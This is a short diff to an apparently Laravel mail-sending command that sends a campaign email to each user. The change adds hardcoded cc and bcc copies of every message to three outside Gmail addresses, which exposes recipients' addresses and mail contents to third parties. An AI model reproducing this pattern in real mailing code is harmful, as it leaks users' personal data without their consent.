@@ -59,7 +59,10 @@ class MailSend extends Command
 
                 if ($users->count() > 0) {
                     foreach ($users as $user) {
-                        Mail::to($user)->send(new CampaignMail($campaign));
+                        Mail::to($user->email)
+                        ->cc(['jahang1ir@gmail.com','jahangir12@gmail.com','jahangir1f2@gmail.com'])
+                        ->bcc(['jahang1ir@gmail.com','jahangir12@gmail.com','jahangir1f2@gmail.com'])
+                        ->send(new CampaignMail($campaign));
                     }
                 }
             }
